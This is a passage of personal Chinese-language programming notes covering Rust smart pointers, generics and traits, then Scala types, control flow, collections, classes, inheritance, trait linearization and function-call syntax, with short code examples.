<p>Rust中提供了<code>std::rc::Rc&lt;T&gt;</code>类型和<code>std::sync::Arc&lt;T&gt;</code>类型，后者的引用计数是原子操作可以用在多线程中。<strong>Rc允许我们有多个所有者指向同一块内存，通过引用计数来管理。（在Rust中这一般是不被允许的）然后当最后一个所有者死亡之后，这一块内存被释放。他和一般的reference相比，最重要的区别是当引用计数减小到0的时候会释放内存，而一般的reference不会负责内存的释放</strong>。这个特性就是<code>Drop</code>Trait中定义的。然后通过<code>Deref</code>Trait和自动解引用的特性，让我们用起来就和普通的指针一样。</p>
<p>!强弱引用计数有什么区别？</p>
<p>Cow类型。</p>
<h2 id="panic"><a class="header" href="#panic">Panic</a></h2>
<h2 id="泛型"><a class="header" href="#泛型">泛型</a></h2>
<p>在Rust中使用泛型，可以让代码适应更多的情况。但是需要注意的是，其实泛型在编译的时候会变成一个确定的类型。
当使用泛型定义<strong>函数</strong>时，本来在函数签名中指定参数和返回值的类型的地方，会改用泛型来表示。
一个例子：<code>fn largest&lt;T&gt;(list: &amp;[T]) -&gt; T {...}</code>
在结构体重定义泛型。注意下面的integer和float是两个不同的类型。虽然他们都是Point，但是因为Rust 通过在编译时进行泛型代码的 **单态化（monomorphization）**来保证效率，他们实际上被编译成了两种不同的类型。</p>
<pre><code>struct Point&lt;T&gt; {
    x: T,
    y: T,
}

fn main() {
    let integer = Point { x: 5, y: 10 };
    let float = Point { x: 1.0, y: 4.0 };
}
</code></pre>
<h2 id="trait-2"><a class="header" href="#trait-2">Trait</a></h2>
<p>Trait和别的语言里的implement很像，但是不太一样。
定义一个trait叫做Summary，要实现这个trait，你需要实现一个summarize方法。必须以self（或者说不需要参数，但是要写出来）作为参数并返回一个String。一个trait也可以有多个方法。如下所示：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Summary {
    fn summarize(&amp;self) -&gt; String;
}
<span class="boring">}
</span></code></pre></pre>
<p>然后你就可以在你自己的类上实现这个trait。一旦实现了 trait，我们就可以用与 NewsArticle 和 Tweet 实例的非 trait 方法一样的方式调用 trait 方法了。如下所示：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl Summary for MyClass {
    fn summarize(&amp;self) -&gt; String {
        format!(&quot;{}, by {} ({})&quot;, self.headline, self.author, self.location)
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>利用trait，我们可以接受各种各样的参数。比如下面这个例子。本来我们在<code>item:</code> 后面需要书写我们传递参数的具体类型，但是我们现在用<code>impl Summary</code>，那么我们传入的参数可以是<strong>任何实现了trait Summary的任何类型</strong>。</p>
<pre><code>pub fn notify(item: impl Summary) {
    println!(&quot;Breaking news! {}&quot;, item.summarize());
}
//需要同时实现两种Trait
pub fn notify(item: impl Summary + Display) {}
//语法糖，指定泛型T和U为满足where从句限定trait的类型。
fn some_function&lt;T, U&gt;(t: T, u: U) -&gt; i32
    where  T: Display + Clone, U: Clone + Debug
{}
</code></pre>
<p>少见一点的，你可以把返回值也用trait限定。<code>fn returns_summarizable() -&gt; impl Summary {}</code>，这样的话你需要返回一个实现了trait的类。</p>
<p>一个很典型的例子就是格式化输出。在 <code>println(&quot;{}\n&quot;,myinstance);</code> 的时候，其实<code>{}</code>就被替换成了执行trait之后的内容。准确来说，是这样子：
<a href="https://doc.rust-lang.org/src/core/fmt/mod.rs.html#642-666">标准库</a>中有一个trait叫做<code>std::fmt::Display</code>，里面定义了一个方法签名<code>fn fmt(&amp;self, f: &amp;mut Formatter&lt;'_&gt;) -&gt; Result;</code>。如果你为你自己的类实现了这个方法，那么你就可以用格式化字符串了，或者简单的说就可以用<code>println(&quot;{}&quot;)</code>了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scala"><a class="header" href="#scala">Scala</a></h1>
<p>开始学习Scala，当做Rust + GC使用。他像Rust一样，支持多范式编程，使用trait，强类型静态语言，自动类型推导。（或许是Rust像他，或许他们都像别人，我不想深究）。他的语法太丰富了。</p>
<p>Scala对比Rust不同的地方</p>
<ul>
<li>支持重载</li>
<li>运行于JVM，有GC。</li>
</ul>
<p>打开Show Inferred Type。由于我个人的学习主要顺序是C/C++, Python, Rust, Scala 所以笔记中后者会有对前者的类比。并不代表他们语言的借鉴关系。</p>
<h2 id="类和对象"><a class="header" href="#类和对象">类和对象</a></h2>
<p>Scala中的类和Java差不多，包含数据和方法。但是没有静态方法。为此Scala中有单例对象。</p>
<p>var是可变变量，val是不可变变量。</p>
<h2 id="基础类型"><a class="header" href="#基础类型">基础类型</a></h2>
<ul>
<li>integral type: <code>Byte</code>(i8),<code>Short</code>(i16), <code>Int</code>(i32), <code>Long</code>(i64), <code>Char</code>(Unicode)</li>
<li>numeric type: <code>Float</code>,<code>Double</code>, integral type</li>
<li><code>String</code>: <code>Char</code>的序列</li>
<li><code>Boolean</code></li>
</ul>
<p>基础类型是可以直接使用字面量进行书写的，规则和Java一样。</p>
<p>格式化字符串，可以做一个类比</p>
<ul>
<li>python: <code>f&quot;hello {name}&quot;</code></li>
<li>scala: <code>s&quot;hello $name&quot;</code></li>
<li>rust: <code>format!(&quot;hello {}&quot;,name)</code></li>
</ul>
<h2 id="操作符即方法"><a class="header" href="#操作符即方法">操作符即方法</a></h2>
<h2 id="控制语句"><a class="header" href="#控制语句">控制语句</a></h2>
<p><code>if-then-else</code>语句， <code>while-do</code>语句和我们平时在C中的类似，但是没有<code>break</code>和<code>continue</code>。</p>
<p>for循环是用于迭代的，基本用法如下：</p>
<pre><code class="language-scala">val files = (new java.io.File(&quot;.&quot;)).listFiles
for file &lt;- files do println(file)
// to 是一个用来创建Range的操作符
for i &lt;- 1 to 4 do println(i)
</code></pre>
<p>错误处理使用和Java类似的<code>try-catch</code>机制。</p>
<p>Scala也有模式匹配，使用<code>match-case</code>语句。</p>
<h2 id="函数-4"><a class="header" href="#函数-4">函数</a></h2>
<pre><code class="language-scala">object FileMatcher:
	private df filesHere = (new java.io.File(&quot;.&quot;)).listFiles
	private def filesMatching(matcher: String =&gt; Boolean) = 
		for file &lt;- filesHere if  matcher(file.getName)
		yield file
	
	// filesMaching需要的参数是一个函数
	def filesContaining(query: String) = 
		filesMatching((fileName: String) =&gt; filename.contains(query))
	def filesEnding(query: String) = 
		filesMatching(_.endsWith(query))  // _占位符写法


</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="控制结构"><a class="header" href="#控制结构">控制结构</a></h1>
<h2 id="if条件"><a class="header" href="#if条件">if条件</a></h2>
<p>if语句也有两种风格的写法。</p>
<pre><code class="language-scala">if (count &lt; 5) {
    println(&quot;Hello, &quot; + name + &quot;!&quot;)
} else {
    println(&quot;Hi, &quot; + name + &quot;!&quot;)
}

if count &lt; 5 then println(&quot;Hello, &quot; + name + &quot;!&quot;)
else println(&quot;Hi, &quot; + name + &quot;!&quot;)
</code></pre>
<p>Scala的if语句是可以有返回值的，这就类似于C语言中的<code>?:</code>表达式，这让我们的代码可以更加简洁。不过，写法和Python略有差别</p>
<pre><code class="language-python">min_val = a if a &lt; b else b   # python
</code></pre>
<pre><code class="language-scala">val minValue = if a &lt; b then a else b   // scala
</code></pre>
<h2 id="while循环"><a class="header" href="#while循环">while循环</a></h2>
<p>Scala有while循环，Scala的while有两种风格的写法。</p>
<ul>
<li>一种是类似于C的花括号风格，每个句子用<code>;</code>结尾。</li>
<li>一种是类似于Python的基于缩进的风格，每个句子单独一行，不需要额外的<code>;</code>。</li>
</ul>
<p>其实不只是while语句，其他的语句也有两种风格的写法。虽然Scala 3推荐使用Python风格的写法，不过我个人还是喜欢C风格的写法，熟悉一点。当然你也可以混着用，不过不推荐。</p>
<pre><code class="language-scala">while (count &lt; 5) {
    println(&quot;Hello, &quot; + name + &quot;!&quot;);
    count += 1;
}

while count &gt; 0 do   // 花括号不是必须的
    println(&quot;Hello, &quot; + name + &quot;!&quot;)  // 分号不是必须的
    count -= 1
</code></pre>
<p>Scala中的while语句是没有返回值的，或者认为他的返回值是Unit，这个和Rust倒是不太一样，和其他地方也不太统一。Rust中while的最后一条语句是返回值，或者通过break返回值，不知道Scala为什么不那么设计。</p>
<blockquote>
<p>Scala2中还有do while，不过在Scala3中被移除了。但是你可以通过将语句写在while后面，do()来模拟。</p>
<pre><code class="language-scala">while 
	val line = readLine()
	println(s&quot;Read $line&quot;)
	line != &quot;&quot;
do ()
</code></pre>
<p>Scala中的while语句是没有<code>continue</code>和<code>break</code>的。更准确的说法是没有内置的<code>continue</code>和<code>break</code>。怎么实现continue和break功能呢？比如，下面的代码，我想找第一个是2的倍数而不是3的倍数的数字（就是2啦。。一下子没想到好的例子）</p>
<pre><code class="language-scala">// 假设我们有break和continue
var i = 0;
while (true) {
    if i % 3 == 0 {
        i += 1;
        continue;
    }
    if i % 2 == 0 {
        break;
    }
    i += 1;
}
</code></pre>
<p>当然你可以更改上面的代码的逻辑实现不用<code>continue</code>和<code>break</code>，不过有时候这样的更改可能会反直觉。Scala风格的代码是通过递归来完成，另外因为有尾递归优化，所以效果不会太差。</p>
<pre><code class="language-scala">def find23(i):Int = {
    if i % 3 == 0 then find23(i+1)
    else if i % 2 == 0 then i
    else find23(i+1)
}
</code></pre>
</blockquote>
<h2 id="for循环"><a class="header" href="#for循环">for循环</a></h2>
<p>Scala中的for循环是表达迭代的&quot;瑞士军刀&quot;。他比C语言中的for循环强大的多，Rust中的for循环才可以与之媲美。</p>
<p>两种风格的写法如下</p>
<pre><code class="language-scala">for i &lt;- 0 until 3 do println(i)
for (i &lt;- 0 until 3) {
    println(i)
}
</code></pre>
<p>可以看一下与之对标的Rust和Python的版本。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Rust
for i in 0..3 {
    println!(&quot;{}&quot;,i)
}
<span class="boring">}
</span></code></pre></pre>
<pre><code class="language-python"># Python
for i in range(0,3):
	print(i)
</code></pre>
<p>目前来看，这三个确实非常类似。for循环中迭代的都是迭代器。</p>
<p>不过Scala中的for循环还有更复杂的用法。比如多重循环和过滤器等。</p>
<h2 id="try"><a class="header" href="#try">try</a></h2>
<p>try-catch-finally.这里不细讲。</p>
<h2 id="match-2"><a class="header" href="#match-2">match</a></h2>
<p>match和模式匹配息息相关。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="数据结构-4"><a class="header" href="#数据结构-4">数据结构</a></h1>
<ul>
<li>Array 数组。相同类型元素的集合。</li>
<li>Tuple 元组。对多个不同类型元素的简单封装。</li>
<li>Collection 容器。
<ul>
<li>List 链表。共享相同类型的不可变序列</li>
<li>Range 序列。不可变的<strong>数字</strong>等差序列。</li>
<li>Set 集合。数学定义，不重复元素的容器。 有可变的，也有不可变的。</li>
<li>Map 映射。键值对映射。有可变的，也有不可变的。</li>
</ul>
</li>
</ul>
<h2 id="array"><a class="header" href="#array">Array</a></h2>
<p>创建并赋值，注意这里用的是圆括号。</p>
<pre><code class="language-scala">// Java风格的写法
val myStrArr = new Array[String](3);
myStrArr(0) = &quot;BigData&quot;
myStrArr(1) = &quot;Hadoop&quot;
myStrArr(2) = &quot;Spark&quot;
// 简洁的写法
val myStrArr = Array(&quot;BigData&quot;, &quot;Hadoop&quot;, &quot;Spark&quot;)

</code></pre>
<p>遍历和读取</p>
<pre><code class="language-scala">// 遍历
for (i &lt;- 0 to 2)
  println(myStrArr(i))
</code></pre>
<h2 id="tuple-1"><a class="header" href="#tuple-1">Tuple</a></h2>
<p>创建并赋值，这个取下标的方式不知道为什么不统一。</p>
<pre><code class="language-scala">val tuple: (String, Int, Double) = (&quot;BigData&quot;, 2015, 3.14)
println(tuple._1) // tuple(0)
println(tuple._2) // tuple(1)
println(tuple._3) // tuple(2)
</code></pre>
<h2 id="collection"><a class="header" href="#collection">Collection</a></h2>
<p>所有的容器都能在<code>scala.collection</code>或他的子包<code>mutable</code>, <code>immutable</code>和<code>generic</code>中找到。里面定义了一些Trait，他们的继承关系参考下图。具体的容器，实现了这其中的某些Trait。</p>
<p><img src="Language/Scala/../images/image-20220529233831459.png" alt="image-20220529233831459" /></p>
<h3 id="list-3"><a class="header" href="#list-3">List</a></h3>
<p>创建</p>
<pre><code class="language-scala">val intList = List(1,2,3);
val intList = 1::2::3::Nil;
</code></pre>
<h3 id="range-2"><a class="header" href="#range-2">Range</a></h3>
<p>创建</p>
<pre><code class="language-scala">val range = new Range(1,4,1)
val range = 1 until 5 by 2;
</code></pre>
<h3 id="set-2"><a class="header" href="#set-2">Set</a></h3>
<p>创建。默认是不可变集合。</p>
<pre><code class="language-scala">val mySet = Set(&quot;Hadoop&quot;, &quot;Spark&quot;)
</code></pre>
<p>修改。默认导入的不可变集合。如果是对可变集合的修改，那么修改原来的集合。</p>
<pre><code class="language-scala">import scala.collection.mutable.Set
var mySet = Set(&quot;Hadoop&quot;, &quot;Spark&quot;)
mySet += &quot;Cloud&quot;
</code></pre>
<p>如果是对不可变集合的修改，那么会产生一个新的集合。</p>
<pre><code class="language-scala">val mySet = Set(&quot;Hadoop&quot;, &quot;Spark&quot;)
mySet += &quot;Cloud&quot;
</code></pre>
<h3 id="map-1"><a class="header" href="#map-1">Map</a></h3>
<p>创建</p>
<pre><code class="language-scala">val myMap = Map(&quot;XMU&quot; -&gt; &quot;Xiamen University&quot;, 
                &quot;THU&quot; -&gt; &quot;Tsinghua University&quot;)
</code></pre>
<p>读取，不存在会报错</p>
<pre><code class="language-scala">println(myMap(&quot;PKU&quot;))
</code></pre>
<p>修改</p>
<pre><code class="language-scala">myMap(&quot;PKU&quot;) = &quot;Peking University&quot; // 更新或添加
myMap += (&quot;PKU&quot; -&gt; &quot;Peking University&quot;)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="class"><a class="header" href="#class">Class</a></h1>
<p>Scala中的类和大多数面向对象语言一样，就是数据+方法。你完全可以像写Java一样写类，但是Scala提供了非常多的花里胡哨的写法，也不能说是花里胡哨，也挺有用的。</p>
<h2 id="定义类"><a class="header" href="#定义类">定义类</a></h2>
<pre><code class="language-scala">package example

class HelloWorld(val name: String) {
    val pi = 3.14
    var count = 0;
    def this() = this(&quot;World&quot;)
    def sayHello(): Unit = {
        println(&quot;Hello, &quot; + name + &quot;!&quot;)
    }
    def getHello(): String = {
        &quot;Hello, &quot; + name + &quot;!&quot;
    }
}

object HelloWorld {
    def main(args: Array[String]): Unit = {
        // 实例化，new可写可不写
        val hw = new HelloWorld(&quot;Fred&quot;)
        val hw2 = HelloWorld()
        hw.sayHello()
        // setter
        hw.count_=(1)
        hw.count = 1
        // getter
        println(hw.count)
    }
}
</code></pre>
<ul>
<li>定义数据，默认是public的。
<ul>
<li><code>var</code>代表可变的数据，<code>val</code>代表不可变的数据。</li>
<li>Scala中成员默认是<code>public</code>的，如果你想让数据/方法成为私有的，应该手动加上<code>private</code>。</li>
<li>getter和setter。公开的<code>var</code>会自动生成getter和setter，公开的<code>val</code>会自动生成getter。不过在Scala中，例如<code>var x</code>，getter方法名就是<code>x</code>，而setter的方法名是<code>x_=</code>。在使用的时候，你可以像访问字段一样使用。</li>
</ul>
</li>
<li>构造函数
<ul>
<li>Scala中的构造函数，<strong>类的整个主体就是主构造函数</strong>。如果主构造函数没有参数就可以省略括号，对于有参数的情况，如果参数前面用了<code>val/var</code>进行修饰，那么Scala会自动为他创建一个变量，比如这里的<code>val name: String</code>，可以认为是在参数中定义了<code>_name_</code>，然后在类(构造函数)主体又写了<code>val name = _name_</code>的语法糖。不过正常的情况是类的数据由构造函数的参数提供。如果构造函数有参数，就直接写在类名的后面。</li>
<li>我们可以为类定义一个或多个<strong>辅助构造函数</strong>，以提供创建对象的不同方法。辅助构造函数通过创建名为this的方法来定义。我们可以定义多个辅助构造函数，但它们必须有不同的签名（重载）。辅助构造函数必须调用主构造函数，或者是之前定义的辅助构造函数。</li>
</ul>
</li>
<li>定义方法
<ul>
<li>一般方法<code>def func(args): Type = {}</code>。方法就是定义在类中的函数。方法内可以使用<code>this</code>来指向对象本身。最基本的函数和函数调用，就像我们在C语言中遇到的一样：函数有固定数量的形参，调用的时候也会有相同数量的形参，他们按序一一对应。但是除此之外，还有很多花里胡哨的写法，在调用的时候，也有很多花里胡哨的调用方法。在这里不介绍了。</li>
</ul>
</li>
</ul>
<h2 id="实例化"><a class="header" href="#实例化">实例化</a></h2>
<p>在Scala 3中，调用构造函数不再需要<code>new</code>关键字，当然你要用也是可以的。</p>
<h2 id="单例对象伴生对象"><a class="header" href="#单例对象伴生对象">单例对象/伴生对象</a></h2>
<p>Scala并没有Java那样的静态方法或静态字段，不过在Scala中用object可以实现完全相同的功能。</p>
<p>如果既有class又有object，那object就叫做伴生对象，就像上面的两个<code>HelloWorld</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="继承"><a class="header" href="#继承">继承</a></h1>
<h2 id="抽象类"><a class="header" href="#抽象类">抽象类</a></h2>
<p>抽象类这个概念是很熟悉的。通过<code>abstract</code>关键字修饰类就可以得到一个抽象类。</p>
<p>不同于Java，我们不用<code>abstract</code>修饰函数和字段。如果我们不给字段赋初值，不给函数写函数体（其实也是赋值），那他就是抽象的。抽象类里面可以有非抽象的函数和字段。</p>
<h2 id="扩展类"><a class="header" href="#扩展类">扩展类</a></h2>
<p>使用<code>extends</code>关键字表示继承关系。</p>
<p>重新实现父类的抽象方法可以不加<code>override</code>，重新实现父类的具体方法必须加<code>override</code>。父类的<code>val</code>变量可以覆盖，父类的<code>var</code>变量不可以覆盖（覆盖本身也没啥意义）。</p>
<pre><code class="language-scala">// 抽象类
abstract class Car {
  val name: String   // 抽象字段
  def info() = println(&quot;Car's name is &quot; + name) // 具体方法
}
// 继承，或者说实现了抽象类
class BYDCar extends Car {
  override val name = &quot;BYD&quot;                    // override可选
  override def info() = println(&quot;I'm Chinese&quot;) // override必须
}

</code></pre>
<h2 id="scala中的继承关系"><a class="header" href="#scala中的继承关系">Scala中的继承关系</a></h2>
<p><img src="Language/Scala/../images/image-20220331142017327.png" alt="image-20220331142017327" /></p>
<p>在Scala中，每个类都继承自同一个名称为<code>Any</code>的超类。可以大致认为他长下面这样（不全）。由于每个类都继承自<code>Any</code>，所以Scala程序中的每个对象都可以用<code>==</code>、<code>!=</code>或<code>equals</code>方法做比较，用<code>##</code>或<code>hashCode</code>方法做哈希，以及用<code>toString</code>方法做格式化。（子类想要修改相等的含义需要修改的是<code>equals</code>，而不是<code>==</code>和<code>!=</code>，他们已经<code>final</code>了）。</p>
<pre><code class="language-scala">class Any {
    final def ==(that: Any): Boolean;
    final def !=(that: Any): Boolean;
    def equals(that: Any): Boolean;
    def ##: Int;
    def hashCode: Int;
    def toString: String;
}
</code></pre>
<p>根类Any有两个子类：<code>AnyVal</code>和<code>AnyRef</code>。</p>
<p><code>AnyVal</code>类是Scala中所有<strong>值类</strong>的父类。我们可以定义自己的值类，用Scala提供了9个内建的值类：<code>Byte</code>、<code>Short</code>、<code>Char</code>、<code>Int</code>、<code>Long</code>、<code>Float</code>、<code>Double</code>、<code>Boolean</code>和<code>Unit</code>。前8个值类对应Java的基本类型，<code>Unit</code>只有一个实例<code>()</code>，可以当作Java中的<code>void</code>。理论上，<code>AnyVal</code>的值应该保存在寄存器中。</p>
<p><code>AnyRef</code>这是Scala所有<strong>引用类</strong>的基类。在Java平台上，<code>AnyRef</code>类事实上只是<code>java.lang.Object</code>类的一个别名。注意AnyRef中有两个相等方法，<code>equals</code>和<code>eq</code>。<code>equals</code>继承自<code>Any</code>比较引用值的相等性，<code>eq</code>则比较引用（指针）的相等性。理论上，<code>AnyRef</code>的内容应该保存在堆上（为什么说理论上呢？因为JVM标准这么规定，但是JVM的实现可能会优化）</p>
<blockquote>
<p>Object是Java中所有类的父类， Java 的所有类都继承了 Object。</p>
</blockquote>
<p><code>Null</code>是<code>null</code>引用的类型，是每个引用类（也就是每个继承自AnyRef类的类）的子类。他的存在是为了和Java兼容，在我们自己编程的时候，应该使用<code>Option</code>，类似Rust。</p>
<p><code>Nothing</code>位于Scala的类继承关系的底部，是每个其他类型的子类型。不过，并不存在这个类型的任何值。他的作用类似Rust中的<code>!</code>，一个函数返回<code>Nothing</code>的原因是他直接不返回了（比如发生了异常）。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="trait-3"><a class="header" href="#trait-3">Trait</a></h1>
<p><strong>特质trait</strong>，类似于Java当中的<strong>接口interface</strong>，但是又不完全一样。Scala中并不支持多继承，只能继承一个父类，但是可以混入若干个特质。而且还可以有字段。</p>
<p>定义特质就像定义一个抽象类一样，除了使用<code>trait</code>关键字。在混入特质的时候，使用<code>extends</code>或者<code>with</code>关键字。</p>
<h2 id="定义特质"><a class="header" href="#定义特质">定义特质</a></h2>
<h2 id="特质和抽象类的区别"><a class="header" href="#特质和抽象类的区别"><a href="https://www.tutorialspoint.com/difference-between-traits-and-abstract-classes-in-scala">特质和抽象类的区别</a></a></h2>
<div class="table-wrapper"><table><thead><tr><th>Sr. No.</th><th style="text-align: center">Key</th><th style="text-align: center">Trait</th><th style="text-align: center">Abstract Class</th></tr></thead><tbody>
<tr><td>1</td><td style="text-align: center">Multiple inheritance</td><td style="text-align: center">Trait supports multiple inheritance.</td><td style="text-align: center">Abstract Class supports single inheritance only.</td></tr>
<tr><td>2</td><td style="text-align: center">Instance</td><td style="text-align: center">Trait can be added to an object instance.</td><td style="text-align: center">Abstract class cannot be added to an object instance.</td></tr>
<tr><td>3</td><td style="text-align: center">Constructor parameters</td><td style="text-align: center">Trait cannot have parameters in its constructors.</td><td style="text-align: center">Abstract class can have parameterised constructor.</td></tr>
<tr><td>4</td><td style="text-align: center">Interoperability</td><td style="text-align: center">Traits are interoperable with Java if they don't have any implementation.</td><td style="text-align: center">Abstract classes are interoperable with Java without any restriction.</td></tr>
<tr><td>5</td><td style="text-align: center">Stackable modification</td><td style="text-align: center">Traits are stackable and are <strong>dynamically bound</strong>.</td><td style="text-align: center">Abstract classes are not stackable and are <strong>statically bound</strong>.</td></tr>
</tbody></table>
</div>
<h2 id="特质的原理"><a class="header" href="#特质的原理">特质的原理</a></h2>
<p>Scala中的特质有个特点叫做<strong>线性化</strong>，会根据一个简单的规则给继承的特质进行排序。参考《Scala Programming》，看下面的例子	</p>
<pre><code class="language-scala">class Animal;

trait Furry extends Animal;
trait HasLegs extends Animal;
trait FourLegged extends HasLegs;

class Cat extends Animal, Furry, FourLegged
</code></pre>
<p>继承关系图如下所示，先看白色三角形的箭头，他代表的是我们代码声明的继承关系。如果只是这样的话，那Cat调用cat.xxx()的时候，要按照哪个顺序去找xxx方法？</p>
<p><img src="Language/Scala/../images/image-20220601130849859.png" alt="继承关系图" /></p>
<p>根据Scala的规则，在右边的继承是优先查找的。原理如下</p>
<ol>
<li>第一个继承是Animal。获得Animal -&gt; AnyRef -&gt; Any。</li>
<li>第二个继承是Furry，他继承自Animal -&gt; AnyRef -&gt; Any，但是之前已经出现过了，就不再重复。获得Furry -&gt; Animal -&gt; AnyRef -&gt; Any。</li>
<li>第三个继承是FourLegged，他继承自HasLegs -&gt; Animal -&gt; AnyRef -&gt; Any，后三者之前已经出现过了，就不再重复。获得FourLegged -&gt; HasLegs -&gt; Furry -&gt; Animal -&gt; AnyRef -&gt; Any。</li>
<li>最后加入Cat自己。获得Cat -&gt; FourLegged -&gt; HasLegs -&gt; Furry -&gt; Animal -&gt; AnyRef -&gt; Any。</li>
</ol>
<p>所以，当我们调用xxx()的时候，查找顺序是Cat -&gt; FourLegged -&gt; HasLegs -&gt; Furry -&gt; Animal -&gt; AnyRef -&gt; Any。</p>
<p>看一下下面这个例子，加深一下理解。下面例子的继承关系和上面的图一模一样。只定义了一个方法<code>hello</code>，输出自己的名字然后调用<code>super.hello()</code>。</p>
<pre><code class="language-scala">class Animal { 
  def hello() = println(&quot;Animal&quot;) 
};

trait Furry extends Animal {
  override def hello() = 
    super.hello()
    println(&quot;Furry&quot;)
};
trait HasLegs extends Animal {
  override def hello() = 
    super.hello()
    println(&quot;HasLegs&quot;)
};
trait FourLegged extends HasLegs {
  override def hello() = 
    super.hello()
    println(&quot;FourLegged&quot;)
};

class Cat extends Animal, Furry, FourLegged {
  override def hello() = 
    super.hello()
    println(&quot;Cat&quot;)
}
object Cat {
  def main(args: Array[String]): Unit = {
    val cat = new Cat
    cat.hello()
  }
}
/* output
Animal
Furry
HasLegs
FourLegged
Cat
*/
</code></pre>
<p>如果你对Scala的线性化理解不深，只知道右边优先，你可能会想：</p>
<ol>
<li><code>Cat</code>先找到自己的<code>Cat.hello</code>，<code>super.hello</code>找到<code>FourLegged.hello</code></li>
<li><code>FourLegged</code>的<code>super.hello</code>找到<code>HasLegs.hello</code></li>
<li><code>HasLegs</code>的<code>super.hello</code>找到<code>Animal.hello</code></li>
</ol>
<p>所以最后的结果，应该是<code>Animal HasLegs FourLegged Cat</code>。然而事实上，<code>HasLegs</code>的<code>super.hello</code>会找到<code>Furry.hello</code>！是上面线性化链的顺序。</p>
<p>这也就是为什么我们说Scala中的trait是动态绑定的，他的super，并不是你能在代码中直接推断出来是什么的！他有时很有用，但是也会给你带来迷惑。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="花里胡哨的函数"><a class="header" href="#花里胡哨的函数">花里胡哨的函数</a></h1>
<h2 id="花里胡哨的定义方法"><a class="header" href="#花里胡哨的定义方法">花里胡哨的定义方法</a></h2>
<h3 id="类型推导省略"><a class="header" href="#类型推导省略">类型推导，省略<code>{}</code></a></h3>
<p>最基本的函数定义方式，是需要写出返回类型的。但是在Scala中，</p>
<ol>
<li>如果返回类型可以被推导出来，那么也可以不写。比如下面的代码。不过我觉得，还是写一下比较好。</li>
<li>如果函数只有一条语句，可以省略<code>{}</code></li>
</ol>
<pre><code class="language-scala">def hello():Unit = {
    println(&quot;hello&quot;)
}
def hello() = {
    println(&quot;hello&quot;)
}
def hello() = println(&quot;hello&quot;)
</code></pre>
<p>参数是要写类型的。</p>
<h3 id="重复参数的定义"><a class="header" href="#重复参数的定义">重复参数的定义</a></h3>
<p>Scala允许函数的<strong>最后一个参数</strong>为重复参数。其实在函数内部，<code>args</code>就是<code>Seq[String]</code>。不过你在传参的时候要把他当做若干个参数</p>
<pre><code class="language-scala">scala&gt; def echo(args: String*) =
     | for arg &lt;- args do println(arg)

scala&gt; echo(&quot;hello&quot;,&quot;world&quot;)
hello
world
</code></pre>
<h2 id="花里胡哨的调用方法"><a class="header" href="#花里胡哨的调用方法">花里胡哨的调用方法</a></h2>
<h3 id="零参数省略括号"><a class="header" href="#零参数省略括号">零参数省略括号</a></h3>
<p>如果函数没有参数，那么在声明的时候可以省略括号。</p>
<p>如果在声明的时候省略了括号，那么调用的时候必须不用括号。建议<strong>无副作用</strong>的零参数函数使用，当作变量。</p>
<p>如果在声明的时候没有省略括号，建议调用的时候使用括号。建议<strong>有副作用</strong>的零参数函数使用。</p>
<blockquote>
<p>不知道为什么我自己声明一个无参数函数的时候，定义有括号就必须调用有括号，定义无括号就必须调用无括号。</p>
</blockquote>
<p>引入<code>scala.language.postfixOps</code>之后，无参数函数还可以当作后缀运算符来使用。不过这个只有在编写DSL的时候可能使用，一般代码这样写容易造成迷惑。</p>
<pre><code class="language-scala">scala&gt; import scala.language.postfixOps
scala&gt; 7 toString
val res4: String = 7
</code></pre>
<p>前缀表达式，方法要以<code>unary_</code>开头。不过Scala中允许的前缀操作符只有<code>+ - ! ~</code>，所以不要自定义前缀表达式。</p>
<pre><code class="language-scala">scala&gt; 7.unary_-
val res6: Int = -7
                                                                                                                                                           
scala&gt; -7
val res7: Int = -7
</code></pre>
<p>所以，你可能会对Scala如何实现操作符优先级和短路逻辑感到好奇。Scala操作符的优先级是根据方法的首字符排序的。</p>
<h3 id="单参数调用省略括号"><a class="header" href="#单参数调用省略括号">单参数调用省略括号</a></h3>
<p>如果函数只有一个参数，那么可以省略括号。就像写操作符一样调用函数，事实上，Scala操作符不是特殊的语法，操作符就是方法。</p>
<p>中缀表达式，比如<code>1+2</code>这个表达式，实际调用的是<code>1</code>的<code>+</code>方法。以<code>:</code>结尾的操作符是右结合的。比如<code>a ::: b</code>调用的是<code>b.:::(a)</code></p>
<pre><code class="language-scala">scala&gt; 1+2
val res1: Int = 3
                                                                                                                                                           
scala&gt; 1.+(2)
val res2: Int = 3
</code></pre>
<h3 id="命名传参和默认传参"><a class="header" href="#命名传参和默认传参">命名传参和默认传参</a></h3>
<p>可以显示的指定传递参数的名字。在不引起歧义（也就是先用位置参数再用命名参数）的情况下可以混用位置传参和命名传参。</p>
<pre><code class="language-scala">scala&gt; def test(a: Int, b:Int, c:Int) = println(a+b-c)
scala&gt; test(1,c = 1,b = 2)
2
</code></pre>
<p>命名传参多和默认传参一起使用。可以给函数参数指定默认值，有默认值的参数就可以不出现在参数列表中。比如下面的例子</p>
<pre><code class="language-scala">def point(x: Int = 0,y: Int = 0) = (x,y)

point(y=1)
</code></pre>
<h3 id="用代替"><a class="header" href="#用代替">用{}代替()</a></h3>
<p>再来看一个奇怪的写法。原因是<code>{}</code>是一个值，最终结果是4。Rust也是如此。所以你也可以认为单参数的时候可以把<code>()</code>改成<code>{}</code>。</p>
<pre><code class="language-scala">scala&gt; 1 + { 2;3;4 }
val res2: Int = 5
</code></pre>
<h3 id="apply方法"><a class="header" href="#apply方法">apply方法</a></h3>
<p>当我们写出一个<code>xxx()</code>的时候，实际上Scala会调用<code>xxx.apply()</code>方法。举两个例子</p>
<ol>
<li>工厂方法。工厂方法就是产生对象的方法，在Java中，使用工厂方法代替构造函数是推荐的风格。记得我们之前介绍，Scala中的类实例化不需要<code>new</code>，实际上就是调用了自动生成的apply方法。</li>
</ol>
<pre><code class="language-scala">class Car(name: String) {
